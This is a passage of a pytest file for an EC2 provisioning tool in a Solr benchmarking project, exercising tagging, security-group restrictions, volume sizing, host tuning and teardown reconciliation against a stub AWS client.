# SPDX-License-Identifier: Apache-2.0
#
# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements. See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the "License"); you may not use this file except in compliance with
# the License. You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""The EC2 provisioning layer, against a stub client.

Nothing here talks to AWS. What is worth asserting offline is the stuff that
is expensive or dangerous to get wrong and cheap to check: that every created
resource is tagged (because teardown finds orphans by tag and nothing else),
that SSH is never opened to the world, and that the remote argv is retargeted
at the driver's interpreter rather than the orchestrator's.
"""

from datetime import datetime, timedelta, timezone

import pytest

# Aliased to `reclaim`, NOT `teardown_module`: pytest treats a module-level
# name `teardown_module` as its xunit module-teardown hook and tries to call
# it, which fails with a baffling "module has no attribute __code__".
from solrorbit.tools.launchr import ledger
from solrorbit.tools.launchr import teardown as reclaim
from solrorbit.tools.launchr.errors import ConfigError, ProvisioningError
from solrorbit.tools.launchr.models import ProfileSpec
from solrorbit.tools.launchr.provisioning.ec2 import (
    DEFAULTS,
    Ec2Provisioning,
    _options,
    _remote_argv,
    _render_host_tuning,
    aws,
)
from solrorbit.tools.launchr.storage import LocalStorageBackend


class StubEc2:
    """Just enough EC2 to exercise the calls launchr makes."""

    def __init__(self, *, instances=None, groups=None, keys=None):
        self.calls: list[tuple[str, dict]] = []
        self._instances = instances or {}
        self._groups = groups or []
        self._keys = keys or []
        self.terminated: list[str] = []
        self.deleted_groups: list[str] = []
        self.deleted_keys: list[str] = []

    def _record(self, name, kwargs):
        self.calls.append((name, kwargs))

    def kwargs_of(self, name):
        return [k for n, k in self.calls if n == name]

    # -- creation ------------------------------------------------------
    def create_security_group(self, **kwargs):
        self._record("create_security_group", kwargs)
        return {"GroupId": "sg-0abc"}

    def authorize_security_group_ingress(self, **kwargs):
        self._record("authorize_security_group_ingress", kwargs)
        return {}

    def create_key_pair(self, **kwargs):
        self._record("create_key_pair", kwargs)
        return {"KeyMaterial": "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----"}

    def run_instances(self, **kwargs):
        self._record("run_instances", kwargs)
        count = kwargs["MinCount"]
        start = len([c for c, _ in self.calls if c == "run_instances"])
        return {"Instances": [{"InstanceId": f"i-{start}{n}"} for n in range(count)]}

    # -- lookups -------------------------------------------------------
    def describe_images(self, **kwargs):
        self._record("describe_images", kwargs)
        return {"Images": [
            {"ImageId": "ami-old", "CreationDate": "2024-01-01T00:00:00Z", "Name": "old"},
            {"ImageId": "ami-new", "CreationDate": "2026-01-01T00:00:00Z", "Name": "new"},
        ]}

    def describe_vpcs(self, **kwargs):
        return {"Vpcs": [{"VpcId": "vpc-1"}]}

    def describe_subnets(self, **kwargs):
        return {"Subnets": [
            {"SubnetId": "subnet-b", "VpcId": "vpc-1", "AvailabilityZone": "eu-north-1b"},
            {"SubnetId": "subnet-a", "VpcId": "vpc-1", "AvailabilityZone": "eu-north-1a"},
        ]}

    def describe_security_groups(self, **kwargs):
        return {"SecurityGroups": self._groups}

    def describe_key_pairs(self, **kwargs):
        return {"KeyPairs": self._keys}

    # -- teardown ------------------------------------------------------
    def get_paginator(self, name):
        return _StubPaginator(self._instances)

    def terminate_instances(self, **kwargs):
        self.terminated += kwargs["InstanceIds"]
        # Reflect the state change, because aws.terminate polls until every
        # instance reports terminated. A stub that stays "running" makes the
        # test hang for the full 600s timeout rather than fail.
        for group in self._instances.values():
            for instance in group:
                if instance["InstanceId"] in kwargs["InstanceIds"]:
                    instance["State"] = {"Name": "terminated"}
        return {}

    def delete_security_group(self, **kwargs):
        self.deleted_groups.append(kwargs["GroupId"])
        return {}

    def delete_key_pair(self, **kwargs):
        self.deleted_keys.append(kwargs["KeyName"])
        return {}


class _StubPaginator:
    def __init__(self, instances):
        self.instances = instances

    def paginate(self, **kwargs):
        # InstanceIds must be honoured: aws.terminate polls describe() for the
        # ids it terminated, and a stub that always returns every instance
        # keeps reporting a sibling as still running -- which polls for the
        # full 600s timeout instead of returning.
        wanted = set(kwargs.get("InstanceIds") or [])
        reservations = []
        for group in self.instances.values():
            matching = [i for i in group if not wanted or i["InstanceId"] in wanted]
            if matching:
                reservations.append({"Instances": matching})
        return [{"Reservations": reservations}]


def _instance(instance_id, stack, *, launched_hours_ago=0.0, state="running"):
    return {
        "InstanceId": instance_id,
        "State": {"Name": state},
        "PrivateIpAddress": "10.0.0.5",
        "PublicIpAddress": "203.0.113.5",
        "InstanceType": "m7i.2xlarge",
        "ImageId": "ami-new",
        "Placement": {"AvailabilityZone": "eu-north-1a"},
        "LaunchTime": datetime.now(timezone.utc) - timedelta(hours=launched_hours_ago),
        "Tags": [
            {"Key": aws.TAG_MANAGED, "Value": "true"},
            {"Key": aws.TAG_SESSION, "Value": stack},
        ],
    }


# ---------------------------------------------------------------------------
# Tagging and safety
# ---------------------------------------------------------------------------


class TestTagging:
    """Tags are the only handle teardown has on a crashed run's resources."""

    def test_every_resource_carries_the_managed_and_session_tags(self):
        tags = {t["Key"]: t["Value"] for t in aws.tags_for("session-a", "ec2-2node")}
        assert tags[aws.TAG_MANAGED] == "true"
        assert tags[aws.TAG_SESSION] == "session-a"
        assert tags[aws.TAG_PROFILE] == "ec2-2node"

    def test_the_project_tag_is_always_present(self):
        # The account's cost reporting keys off `project`; an untagged
        # instance is invisible in the per-project budget.
        tags = {t["Key"]: t["Value"] for t in aws.tags_for("s", "p")}
        assert tags["project"] == "solr"

    def test_instances_and_volumes_are_both_tagged(self):
        # An untagged volume outlives its instance as a billing line nobody
        # can trace back.
        ec2 = StubEc2()
        aws.run_instances(
            ec2, count=2, role="solr", name_prefix="n", instance_type="m7i.2xlarge",
            ami="ami-1", subnet_id="subnet-a", security_group_id="sg-1", key_name="k",
            user_data="#!/bin/bash", volume_gb=100, session_id="s", profile="p",
        )
        resources = {
            spec["ResourceType"] for spec in ec2.kwargs_of("run_instances")[0]["TagSpecifications"]
        }
        assert resources == {"instance", "volume"}


class TestSecurityGroup:
    def test_ssh_is_restricted_to_the_given_cidr(self):
        ec2 = StubEc2()
        aws.create_security_group(ec2, vpc_id="vpc-1", session_id="s", profile="p",
                                  ssh_cidrs=["198.51.100.7/32"])
        rules = ec2.kwargs_of("authorize_security_group_ingress")[0]["IpPermissions"]
        ssh = [r for r in rules if r["FromPort"] == 22][0]
        assert ssh["IpRanges"] == [{"CidrIp": "198.51.100.7/32",
                                    "Description": "launchr control"}]

    def test_every_configured_range_is_opened(self):
        # A single /32 of a laptop is a snapshot of a value that moves; extra
        # stable ranges are what stop an IP change killing an hours-long run.
        ec2 = StubEc2()
        aws.create_security_group(ec2, vpc_id="vpc-1", session_id="s", profile="p",
                                  ssh_cidrs=["198.51.100.7/32", "10.0.0.0/8"],
                                  admin_ports=(8983,))
        rules = ec2.kwargs_of("authorize_security_group_ingress")[0]["IpPermissions"]
        for port in (22, 8983):
            opened = {r["CidrIp"] for r in
                      [x for x in rules if x["FromPort"] == port][0]["IpRanges"]}
            assert opened == {"198.51.100.7/32", "10.0.0.0/8"}, port

    def test_solr_and_zookeeper_are_not_exposed_to_the_internet(self):
        # They are reachable only from inside the group, which is what makes
        # a public-IP benchmark instance not a public Solr.
        ec2 = StubEc2()
        aws.create_security_group(ec2, vpc_id="vpc-1", session_id="s", profile="p",
                                  ssh_cidrs=["198.51.100.7/32"])
        rules = ec2.kwargs_of("authorize_security_group_ingress")[0]["IpPermissions"]
        for rule in rules:
            if rule["FromPort"] == 22:
                continue
            assert "IpRanges" not in rule or rule["IpRanges"] == []
            assert rule["UserIdGroupPairs"][0]["GroupId"] == "sg-0abc"

    def test_every_internal_port_is_opened(self):
        ec2 = StubEc2()
        aws.create_security_group(ec2, vpc_id="vpc-1", session_id="s", profile="p",
                                  ssh_cidrs=["10.0.0.1/32"])
        rules = ec2.kwargs_of("authorize_security_group_ingress")[0]["IpPermissions"]
        opened = {r["FromPort"] for r in rules}
        assert set(aws.INTERNAL_PORTS) <= opened


class TestLookups:
    def test_the_newest_ami_wins(self):
        assert aws.latest_ami(StubEc2()) == "ami-new"

    def test_no_matching_ami_says_to_set_one(self):
        class Empty(StubEc2):
            def describe_images(self, **kwargs):
                return {"Images": []}

        with pytest.raises(ProvisioningError, match="options.ami"):
            aws.latest_ami(Empty())

    def test_subnet_choice_is_deterministic(self):
        # Two runs must land in the same AZ, or their numbers are not
        # comparable; sorting makes that true without anyone pinning it.
        subnet, vpc, zone = aws.default_subnet(StubEc2())
        assert (subnet, vpc, zone) == ("subnet-a", "vpc-1", "eu-north-1a")

    def test_a_missing_default_vpc_is_a_clear_error(self):
        class NoVpc(StubEc2):
            def describe_vpcs(self, **kwargs):
                return {"Vpcs": []}

        with pytest.raises(ProvisioningError, match="subnet_id"):
            aws.default_subnet(NoVpc())


class TestOptions:
    def test_defaults_fill_in(self):
        profile = ProfileSpec(name="p", provisioning="ec2", install_method="docker-ssh")
        assert _options(profile)["instance_type"] == DEFAULTS["instance_type"]

    def test_a_typo_in_an_option_is_rejected(self):
        # Silently ignoring `instance_typ` would run the wrong hardware and
        # produce a report that looks entirely normal.
        profile = ProfileSpec(name="p", provisioning="ec2", install_method="docker-ssh",
                              options={"instance_typ": "m7i.large"})
        with pytest.raises(ConfigError, match="unknown ec2 options"):
            _options(profile)

    def test_given_options_win_over_defaults(self):
        profile = ProfileSpec(name="p", provisioning="ec2", install_method="docker-ssh",
                              options={"instance_type": "r7i.2xlarge"})
        assert _options(profile)["instance_type"] == "r7i.2xlarge"


class TestSshCidrs:
    """Which addresses may reach the cluster's control ports.

    The default is this machine, detected at provision time. That is right,
    and it is also a snapshot of a value that moves: a public address can
    change mid-run and a `/32` captured earlier then silently stops matching,
    killing an hours-long benchmark at the transport layer with nothing wrong
    with it. `extra_ssh_cidrs` names stable ranges to open alongside it.
    """

    def test_the_detected_address_is_the_default(self, monkeypatch):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        monkeypatch.setattr(mod, "_public_ip", lambda: "198.51.100.7")
        assert mod._ssh_cidrs({}) == ["198.51.100.7/32"]

    def test_extra_ranges_are_added_not_substituted(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _ssh_cidrs

        assert _ssh_cidrs({"ssh_cidr": "198.51.100.7/32",
                           "extra_ssh_cidrs": ["10.0.0.0/8", "192.0.2.0/24"]}) == [
            "198.51.100.7/32", "10.0.0.0/8", "192.0.2.0/24"]

    def test_a_bare_address_is_widened_to_a_host_range(self):
        # AWS insists on the prefix and its error for a missing one is poor.
        from solrorbit.tools.launchr.provisioning.ec2 import _ssh_cidrs

        assert _ssh_cidrs({"ssh_cidr": "8.8.8.8"}) == ["8.8.8.8/32"]

    def test_a_comma_separated_string_is_accepted(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _ssh_cidrs

        assert _ssh_cidrs({"ssh_cidr": "10.0.0.1/32",
                           "extra_ssh_cidrs": "192.0.2.0/24, 198.51.100.0/24"}) == [
            "10.0.0.1/32", "192.0.2.0/24", "198.51.100.0/24"]

    def test_duplicates_collapse(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _ssh_cidrs

        assert _ssh_cidrs({"ssh_cidr": "10.0.0.1/32",
                           "extra_ssh_cidrs": ["10.0.0.1/32"]}) == ["10.0.0.1/32"]

    def test_a_malformed_range_names_itself(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _ssh_cidrs

        with pytest.raises(ConfigError, match="not a valid CIDR"):
            _ssh_cidrs({"ssh_cidr": "10.0.0.1/32", "extra_ssh_cidrs": ["office"]})

    def test_the_option_is_recognised_by_the_profile(self):
        profile = ProfileSpec(name="p", provisioning="ec2", install_method="docker-ssh",
                              options={"extra_ssh_cidrs": ["10.0.0.0/8"]})
        assert _options(profile)["extra_ssh_cidrs"] == ["10.0.0.0/8"]


class TestDataVolume:
    """Where the index lives, and on what.

    The root volume sits at the gp3 baseline of 3000 IOPS and 125 MB/s. A
    merge-heavy indexing run against that is plausibly measuring the disk
    rather than Solr, which is the one thing a version comparison must not do.
    """

    def test_a_dedicated_volume_is_the_default(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _data_volume

        spec = _data_volume({})
        assert spec["mode"] == "ebs"
        assert spec["iops"] > 3000 and spec["throughput_mbps"] > 125

    def test_root_mode_attaches_nothing(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _data_volume

        assert _data_volume({"data_volume": {"mode": "root"}}) is None

    def test_an_unknown_mode_is_rejected(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _data_volume

        with pytest.raises(ConfigError, match="must be 'ebs' or 'root'"):
            _data_volume({"data_volume": {"mode": "instance-store"}})

    def test_the_block_mapping_carries_iops_and_throughput(self):
        spec = {"size_gb": 500, "type": "gp3", "iops": 16000, "throughput_mbps": 1000}
        devices = aws._block_devices(150, "gp3", spec)
        data = [d for d in devices if d["DeviceName"] == aws.DATA_DEVICE][0]
        assert data["Ebs"]["Iops"] == 16000
        assert data["Ebs"]["Throughput"] == 1000
        assert data["Ebs"]["VolumeSize"] == 500

    def test_every_volume_is_deleted_with_its_instance(self):
        # A volume that outlives its instance is a billing line with nothing
        # attached to explain it.
        devices = aws._block_devices(150, "gp3", {"size_gb": 500, "type": "gp3"})
        assert all(d["Ebs"]["DeleteOnTermination"] for d in devices)
        assert len(devices) == 2

    def test_root_mode_maps_only_the_root_device(self):
        devices = aws._block_devices(150, "gp3", None)
        assert [d["DeviceName"] for d in devices] == ["/dev/xvda"]

    def test_unset_iops_is_not_sent(self):
        # io1/io2 reject Throughput and gp2 rejects both; only send what was asked.
        devices = aws._block_devices(150, "gp3", {"size_gb": 500, "type": "gp2"})
        data = [d for d in devices if d["DeviceName"] == aws.DATA_DEVICE][0]
        assert "Iops" not in data["Ebs"] and "Throughput" not in data["Ebs"]


class TestDriverCorpusVolume:
    """The driver's corpus cache needs capacity, not throughput.

    One nyc_taxis is 84.6 GB on disk -- 79.8 GB decompressed plus the 4.8 GB
    archive Solr Orbit keeps beside it -- and the cache is shared by every
    cell and workload in a session. On the root volume a matrix of several
    large workloads fills the disk partway through a download, hours in.
    """

    def _spec(self, options=None):
        from solrorbit.tools.launchr.provisioning.ec2 import (
            DEFAULT_DRIVER_DATA_VOLUME, _data_volume,
        )
        return _data_volume(options or {}, key="driver_data_volume",
                            defaults=DEFAULT_DRIVER_DATA_VOLUME)

    def test_the_driver_gets_its_own_volume_by_default(self):
        spec = self._spec()
        assert spec["mode"] == "ebs"
        # Sized from the workloads at provision time, once they are known.
        assert str(spec["size_gb"]).lower() == "auto"

    def test_it_can_be_put_back_on_the_root_disk(self):
        assert self._spec({"driver_data_volume": {"mode": "root"}}) is None

    def test_the_error_names_the_right_option(self):
        with pytest.raises(ConfigError, match="driver_data_volume.mode"):
            self._spec({"driver_data_volume": {"mode": "nonsense"}})

    def test_the_driver_user_data_mounts_and_makes_the_corpus_dir(self):
        from solrorbit.tools.launchr.provisioning.ec2 import (
            CORPUS_SUBDIR, DRIVER_DATA_DIR, DRIVER_USER_DATA, MOUNT_DATA_VOLUME,
        )

        rendered = DRIVER_USER_DATA.format(
            data_dir=DRIVER_DATA_DIR, corpus_subdir=CORPUS_SUBDIR,
            mount_data_volume=MOUNT_DATA_VOLUME.format(data_dir=DRIVER_DATA_DIR))
        assert "mkfs.xfs" in rendered
        assert f"{DRIVER_DATA_DIR}/{CORPUS_SUBDIR}" in rendered
        assert "{" not in rendered.replace("${", "").replace("$(", "")

    def test_the_mount_finds_the_disk_by_filesystem_not_by_name(self):
        # On Nitro the kernel renames /dev/sdb to /dev/nvme1n1, so the name
        # we asked EC2 for never appears.
        from solrorbit.tools.launchr.provisioning.ec2 import DATA_DIR, MOUNT_DATA_VOLUME

        rendered = MOUNT_DATA_VOLUME.format(data_dir=DATA_DIR)
        assert "FSTYPE" in rendered and "PKNAME" in rendered
        assert "/dev/sdb" not in rendered

    def test_the_root_disk_is_never_reformatted(self):
        from solrorbit.tools.launchr.provisioning.ec2 import DATA_DIR, MOUNT_DATA_VOLUME

        rendered = MOUNT_DATA_VOLUME.format(data_dir=DATA_DIR)
        assert "ROOT_DISK" in rendered
        assert 'continue' in rendered


class TestAutoSizedCorpusVolume:
    """Sizing the driver's disk from what the workloads declare.

    The numbers are read out of the workload template with a regex rather
    than by rendering it: rendering needs Jinja, the workloads repository on
    disk and a full Solr Orbit config, and all that is wanted is an order of
    magnitude to size a disk with -- which is then doubled anyway.
    """

    def test_a_github_url_becomes_a_raw_url(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _raw_base_url

        assert _raw_base_url("https://github.com/apache/solr-orbit-workloads") == \
            "https://raw.githubusercontent.com/apache/solr-orbit-workloads/main"

    def test_a_non_github_url_is_not_guessed_at(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _raw_base_url

        assert _raw_base_url("git@gitlab.com:x/y.git") is None

    def test_sizes_are_doubled(self, monkeypatch):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        # 10 GB declared -> 20 GB wanted, but never below the floor.
        monkeypatch.setattr(mod, "_declared_corpus_bytes", lambda *a: 10_000_000_000)
        got = mod._auto_corpus_size_gb(["w"], "https://github.com/o/r")
        assert got == max(20, mod.MIN_CORPUS_VOLUME_GB)

    def test_several_workloads_add_up(self, monkeypatch):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        monkeypatch.setattr(mod, "_declared_corpus_bytes", lambda *a: 100_000_000_000)
        assert mod._auto_corpus_size_gb(["a", "b"], "https://github.com/o/r") == 400

    def test_an_unreadable_workload_gives_up_rather_than_guesses(self, monkeypatch):
        # Returning a too-small number would fill the disk hours into a run.
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        monkeypatch.setattr(mod, "_declared_corpus_bytes", lambda *a: None)
        assert mod._auto_corpus_size_gb(["w"], "https://github.com/o/r") is None

    def test_the_floor_applies_to_a_tiny_corpus(self, monkeypatch):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        monkeypatch.setattr(mod, "_declared_corpus_bytes", lambda *a: 1_000_000)
        assert mod._auto_corpus_size_gb(["w"], "https://github.com/o/r") == \
            mod.MIN_CORPUS_VOLUME_GB

    def test_auto_is_the_default_and_resolves_to_a_number(self, monkeypatch):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        monkeypatch.setattr(mod, "_auto_corpus_size_gb", lambda *a, **k: 240)
        strategy = mod.Ec2Provisioning(workloads=["nyc_taxis"])
        assert strategy._resolve_driver_volume({})["size_gb"] == 240

    def test_an_explicit_size_is_not_overridden(self):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        strategy = mod.Ec2Provisioning(workloads=["nyc_taxis"])
        spec = strategy._resolve_driver_volume({"driver_data_volume": {"size_gb": 42}})
        assert spec["size_gb"] == 42

    def test_it_falls_back_when_sizing_fails(self, monkeypatch):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        monkeypatch.setattr(mod, "_auto_corpus_size_gb", lambda *a, **k: None)
        strategy = mod.Ec2Provisioning(workloads=["nyc_taxis"])
        assert strategy._resolve_driver_volume({})["size_gb"] == mod.FALLBACK_CORPUS_VOLUME_GB

    def test_no_workloads_means_the_fallback(self):
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        assert mod.Ec2Provisioning()._resolve_driver_volume({})["size_gb"] == \
            mod.FALLBACK_CORPUS_VOLUME_GB


class TestHostTuning:
    """Unpinned THP or a powersave governor are among the likelier causes of
    unexplained run-to-run variance."""

    def test_defaults_remove_variance(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _host_tuning

        tuning = _host_tuning({})
        assert tuning["transparent_hugepages"] == "never"
        assert tuning["swappiness"] == 1
        assert tuning["cpu_governor"] == "performance"

    def test_a_null_value_leaves_the_machine_alone(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _host_tuning

        tuning = _host_tuning({"host_tuning": {"cpu_governor": None}})
        assert "cpu_governor" not in tuning
        assert tuning["transparent_hugepages"] == "never"

    def test_an_unknown_key_is_rejected(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _host_tuning

        with pytest.raises(ConfigError, match="Unknown host_tuning keys"):
            _host_tuning({"host_tuning": {"numa_balancing": "off"}})

    def test_an_invalid_thp_value_is_rejected(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _host_tuning, _render_host_tuning

        with pytest.raises(ConfigError, match="never, madvise or always"):
            _render_host_tuning(_host_tuning({"host_tuning": {"transparent_hugepages": "off"}}))

    def test_the_rendered_script_sets_what_was_asked(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _host_tuning, _render_host_tuning

        script = _render_host_tuning(_host_tuning({}))
        assert "transparent_hugepage/enabled" in script
        assert "vm.swappiness=1" in script
        assert "scaling_governor" in script

    def test_nothing_requested_renders_a_no_op(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _render_host_tuning

        assert "#" in _render_host_tuning({})

    def test_the_user_data_template_renders(self):
        # A KeyError here would only surface at provision time, having
        # already created a security group and a key pair.
        from solrorbit.tools.launchr.provisioning.ec2 import (
            DATA_DIR, SOLR_USER_DATA, _host_tuning, _render_host_tuning,
        )

        from solrorbit.tools.launchr.provisioning.ec2 import MOUNT_DATA_VOLUME

        rendered = SOLR_USER_DATA.format(
            host_tuning=_render_host_tuning(_host_tuning({})), data_dir=DATA_DIR,
            mount_data_volume=MOUNT_DATA_VOLUME.format(data_dir=DATA_DIR))
        assert rendered.startswith("#!/bin/bash")
        assert "vm.swappiness=1" in rendered
        assert DATA_DIR in rendered
        assert "{" not in rendered.replace("${", "").replace("$(", "")


class TestRemoteArgv:
    HOME = "/home/ec2-user"

    def test_the_local_interpreter_is_replaced_by_the_drivers(self):
        import sys

        argv = _remote_argv([sys.executable, "-m", "solrorbit.benchmark", "run"], self.HOME)
        assert argv[0] == f"{self.HOME}/orbit-venv/bin/python"
        assert argv[1:] == ["-m", "solrorbit.benchmark", "run"]

    def test_an_argv_not_starting_with_the_interpreter_is_left_alone(self):
        assert _remote_argv(["solr-orbit", "run"], self.HOME) == ["solr-orbit", "run"]

    def test_the_interpreter_path_survives_shell_quoting(self):
        # The bug: remote paths were written with a leading "~", every argv is
        # shlex.quote'd before crossing the SSH shell, and quoting suppresses
        # tilde expansion. The far side then looked for a directory literally
        # named "~" and exited 127 before the benchmark started.
        import shlex
        import sys

        argv = _remote_argv([sys.executable, "-m", "solrorbit.benchmark"], self.HOME)
        rendered = " ".join(shlex.quote(a) for a in argv)
        assert "~" not in rendered
        assert rendered.startswith(f"{self.HOME}/orbit-venv/bin/python")

    def test_no_remote_path_constant_uses_a_tilde(self):
        from solrorbit.tools.launchr.provisioning.ec2 import (
            REMOTE_PYTHON, REMOTE_REPORT, REMOTE_VENV,
        )

        for value in (REMOTE_VENV, REMOTE_PYTHON, REMOTE_REPORT):
            assert not value.startswith("~"), value


class TestWheelBuild:
    """The driver runs the wheel built from this working tree."""

    def test_the_project_root_is_where_pyproject_lives(self):
        # Previously counted with parents[4], which pointed uv build at the
        # package directory instead of the project and failed every cell.
        from solrorbit.tools.launchr.provisioning.ec2 import _project_root

        root = _project_root()
        assert (root / "pyproject.toml").is_file()
        assert (root / "solrorbit" / "__init__.py").is_file()

    def test_it_is_not_the_package_directory(self):
        from solrorbit.tools.launchr.provisioning.ec2 import _project_root

        assert _project_root().name != "solrorbit"


class TestLoggingSafety:
    def test_botocore_is_not_left_at_debug(self):
        # botocore logs the body of every API response, and an AssumeRole
        # response body is a temporary access key and secret in plain text.
        # `launchr -v` must not print those to a terminal or a CI log.
        import logging

        from solrorbit.tools.launchr import cli

        cli._quiet_noisy_libraries(logging.DEBUG)
        for name in cli._NOISY:
            assert logging.getLogger(name).level >= logging.INFO, name

    def test_quieting_never_raises_the_level_below_what_was_asked(self):
        import logging

        from solrorbit.tools.launchr import cli

        cli._quiet_noisy_libraries(logging.WARNING)
        assert logging.getLogger("botocore").level == logging.WARNING


class TestTeardownIsSafe:
    def test_teardown_without_a_stack_does_nothing(self):
        from solrorbit.tools.launchr.models import ProvisionedInfra

        profile = ProfileSpec(name="p", provisioning="ec2", install_method="docker-ssh")
        infra = ProvisionedInfra(profile=profile, strategy="ec2", install_method="docker-ssh")
        Ec2Provisioning().teardown(infra)  # must not raise, must not call AWS

    def test_terminate_tolerates_an_empty_list(self):
        ec2 = StubEc2()
        aws.terminate(ec2, [])
        assert ec2.terminated == []


# ---------------------------------------------------------------------------
# Reconciliation
# ---------------------------------------------------------------------------


@pytest.fixture
def storage(tmp_path):
    return LocalStorageBackend(tmp_path / "results")


class TestReconcile:
    def _patch_client(self, monkeypatch, ec2):
        monkeypatch.setattr(aws, "client", lambda *a, **k: ec2)
        monkeypatch.setattr(reclaim.aws, "client", lambda *a, **k: ec2)

    def test_a_tagged_instance_is_terminated(self, storage, monkeypatch):
        ec2 = StubEc2(instances={"s-1": [_instance("i-1", "s-1")]})
        self._patch_client(monkeypatch, ec2)
        result = reclaim.reconcile(storage, regions=["eu-north-1"])
        assert ec2.terminated == ["i-1"]
        assert result.instance_count == 1

    def test_a_dry_run_destroys_nothing(self, storage, monkeypatch):
        ec2 = StubEc2(instances={"s-1": [_instance("i-1", "s-1")]})
        self._patch_client(monkeypatch, ec2)
        result = reclaim.reconcile(storage, regions=["eu-north-1"], dry_run=True)
        assert ec2.terminated == []
        assert result.instance_count == 1
        assert "Would terminate" in result.describe(dry_run=True)

    def test_the_ledger_is_closed_after_reclaiming(self, storage, monkeypatch):
        ledger.record_provisioned(storage, "s-1", {"region": "eu-north-1"})
        ec2 = StubEc2(instances={"s-1": [_instance("i-1", "s-1")]})
        self._patch_client(monkeypatch, ec2)
        reclaim.reconcile(storage, regions=["eu-north-1"])
        assert ledger.leaked(storage) == []

    def test_the_ledger_names_a_region_the_caller_did_not(self, storage, monkeypatch):
        # The point of the ledger: a tag query only sees the region you are
        # already in, so a leak elsewhere is otherwise invisible.
        ledger.record_provisioned(storage, "s-1", {"region": "us-east-1"})
        ec2 = StubEc2(instances={"s-1": [_instance("i-1", "s-1")]})
        self._patch_client(monkeypatch, ec2)
        result = reclaim.reconcile(storage, regions=[])
        assert "us-east-1" in result.regions
        assert ec2.terminated == ["i-1"]

    def test_a_ledger_entry_with_nothing_live_is_closed_out(self, storage, monkeypatch):
        # Someone terminated by hand, or provisioning died before creating
        # anything. Either way it must stop being reported as a leak forever.
        ledger.record_provisioned(storage, "s-gone", {"region": "eu-north-1"})
        self._patch_client(monkeypatch, StubEc2(instances={}))
        result = reclaim.reconcile(storage, regions=["eu-north-1"])
        assert result.closed == ["s-gone"]
        assert ledger.leaked(storage) == []

    def test_older_than_protects_a_run_in_flight(self, storage, monkeypatch):
        # Without this guard, running teardown during a nightly looks exactly
        # like finding a leak.
        ec2 = StubEc2(instances={"s-young": [_instance("i-1", "s-young", launched_hours_ago=0.2)]})
        self._patch_client(monkeypatch, ec2)
        result = reclaim.reconcile(
            storage, regions=["eu-north-1"], older_than=timedelta(hours=6),
        )
        assert ec2.terminated == []
        assert any("younger" in note for note in result.skipped)

    def test_older_than_still_reclaims_an_old_stack(self, storage, monkeypatch):
        ec2 = StubEc2(instances={"s-old": [_instance("i-1", "s-old", launched_hours_ago=12)]})
        self._patch_client(monkeypatch, ec2)
        reclaim.reconcile(storage, regions=["eu-north-1"], older_than=timedelta(hours=6))
        assert ec2.terminated == ["i-1"]

    def test_one_stack_can_be_targeted(self, storage, monkeypatch):
        ec2 = StubEc2(instances={
            "s-1": [_instance("i-1", "s-1")],
            "s-2": [_instance("i-2", "s-2")],
        })
        self._patch_client(monkeypatch, ec2)
        reclaim.reconcile(storage, regions=["eu-north-1"], stack_id="s-2")
        assert ec2.terminated == ["i-2"]

    def test_a_live_stacks_key_and_group_survive(self, storage, monkeypatch):
        # Deleting a running benchmark's security group would strip its
        # cluster's own ingress rules out from under it.
        ec2 = StubEc2(
            instances={"s-young": [_instance("i-1", "s-young", launched_hours_ago=0.1)]},
            groups=[{"GroupId": "sg-live",
                     "Tags": [{"Key": aws.TAG_SESSION, "Value": "s-young"}]}],
            keys=[{"KeyName": "launchr-s-young",
                   "Tags": [{"Key": aws.TAG_SESSION, "Value": "s-young"}]}],
        )
        self._patch_client(monkeypatch, ec2)
        reclaim.reconcile(storage, regions=["eu-north-1"], older_than=timedelta(hours=6))
        assert ec2.deleted_groups == []
        assert ec2.deleted_keys == []

    def test_a_failed_sweep_leaves_the_ledger_entry_open(self, storage, monkeypatch):
        # The bug this guards: a sweep that fails with AuthFailure proves
        # nothing about what is running. Closing the entry anyway would mark a
        # real leak as released and hide it from every future run -- the exact
        # outcome the ledger exists to prevent.
        ledger.record_provisioned(storage, "s-1", {"region": "eu-north-1"})

        def broken(service, *, region, profile=None):
            raise RuntimeError("AuthFailure: not authorized")

        monkeypatch.setattr(reclaim.aws, "client", broken)
        result = reclaim.reconcile(storage, regions=["eu-north-1"])
        assert result.closed == []
        assert [e.stack_id for e in ledger.leaked(storage)] == ["s-1"]
        assert any("could not be swept" in note for note in result.skipped)

    def test_an_entry_with_no_region_needs_every_sweep_to_succeed(self, storage, monkeypatch):
        ledger.record_provisioned(storage, "s-noregion", {})

        def half_broken(service, *, region, profile=None):
            if region == "broken":
                raise RuntimeError("nope")
            return StubEc2(instances={})

        monkeypatch.setattr(reclaim.aws, "client", half_broken)
        result = reclaim.reconcile(storage, regions=["broken", "eu-north-1"])
        assert result.closed == []
        assert ledger.leaked(storage)

    def test_releasing_twice_is_not_an_error(self, storage, monkeypatch):
